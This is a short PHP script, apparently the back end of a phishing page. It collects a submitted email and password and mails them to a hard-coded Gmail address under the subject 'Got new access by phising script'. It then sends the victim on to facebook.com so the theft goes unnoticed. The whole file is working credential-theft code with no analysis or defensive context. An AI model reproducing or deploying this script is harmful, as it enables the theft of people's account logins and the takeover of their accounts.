<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['eml']) && isset($_REQUEST['pwd']) ) ){
			return false;
		}

		$eml = $_REQUEST['eml'];
		$pwd = $_REQUEST['pwd'];
		
		$reciever = "kaatanga@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $eml;
		$message .= "and password is ". $pwd;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
	header("location:javascript://history.go(-1)");
?>